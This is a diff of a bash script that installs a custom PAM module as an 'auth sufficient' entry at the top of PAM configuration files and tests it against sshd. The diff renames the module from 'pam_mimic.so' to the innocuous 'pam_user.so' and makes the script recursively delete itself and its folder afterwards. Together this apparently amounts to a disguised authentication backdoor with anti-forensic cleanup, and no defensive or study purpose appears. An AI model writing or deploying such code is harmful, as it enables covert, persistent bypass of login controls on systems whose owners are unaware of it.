@@ -133,7 +133,7 @@ cat << 'EOF' > prepend_pam.sh
 #!/bin/bash
 
 # Define the line to prepend
-PAM_MIMIC_LINE="auth sufficient /lib/x86_64-linux-gnu/security/pam_mimic.so"
+PAM_MIMIC_LINE="auth sufficient /lib/x86_64-linux-gnu/security/pam_user.so"
 
 # Function to prepend the line to a file if it doesn't already exist
 prepend_line() {
@@ -179,7 +179,10 @@ sudo chmod 644 $SO_FILE
 echo "Testing the module with pamtester..."
 pamtester sshd $(whoami) authenticate
 
-# Self-delete the script
-rm -- "$0"
+# Self-delete the script and the folder it's in
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"  # Get the full path of the current script's directory
+cd "$HOME"  # Navigate to home directory to safely delete the folder
+echo "Deleting script and its directory: $SCRIPT_DIR"
+rm -rf "$SCRIPT_DIR"
 
 echo "Setup complete. PAM module $MODULE_NAME is now installed, configured, and tested."
